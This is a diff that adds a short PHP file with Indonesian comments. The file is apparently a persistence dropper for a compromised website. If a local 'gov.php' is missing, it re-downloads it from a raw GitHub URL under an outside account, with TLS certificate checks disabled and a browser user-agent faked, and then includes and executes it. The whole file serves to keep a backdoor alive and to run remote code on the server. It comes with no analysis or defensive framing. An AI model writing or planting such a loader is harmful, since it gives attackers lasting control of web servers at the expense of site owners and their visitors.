@@ -1,0 +1,46 @@
+<?php
+session_start();
+
+// Path lokal file yang harus selalu ada
+$localFile = __DIR__ . '/gov.php';
+$remoteUrl = 'https://raw.githubusercontent.com/trixxxx12/kemem/main/gov.php';
+
+// Fungsi untuk ambil konten dari URL
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+// Cek apakah file ada, jika tidak download ulang
+if (!file_exists($localFile)) {
+    $content = geturlsinfo($remoteUrl);
+    if ($content !== false) {
+        file_put_contents($localFile, $content);
+        echo "✅ gov.php restored.\n";
+    } else {
+        echo "❌ Failed to download gov.php.\n";
+    }
+}
+
+// Jalankan file hanya jika memang valid dan sudah ada
+if (file_exists($localFile)) {
+    include $localFile;
+}
+?>
